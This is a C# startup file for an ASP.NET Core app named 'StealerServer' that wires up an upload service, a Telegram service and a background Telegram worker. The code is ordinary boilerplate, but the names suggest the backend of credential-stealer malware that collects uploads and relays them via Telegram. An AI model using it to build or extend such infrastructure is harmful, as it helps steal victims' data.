using Scalar.AspNetCore;
using StealerServer.BackgroundWorkers;
using StealerServer.Service;

namespace StealerServer;

public class Program
{
    public static void Main(string[] args)
    {
        var builder = WebApplication.CreateBuilder(args);

        builder.Services.AddControllers();
        builder.Services.AddOpenApi();
        builder.Services.AddScoped<UploadService>();

        builder.Services.AddSingleton<TelegramService>();

        builder.Services.AddHostedService<TelegramWorker>();


        var app = builder.Build();

        if (app.Environment.IsDevelopment())
        {
            app.MapOpenApi();
            app.MapScalarApiReference();
        }

        app.UseHttpsRedirection();
        app.UseAuthorization();

        app.MapControllers();

        app.Run();
    }
}
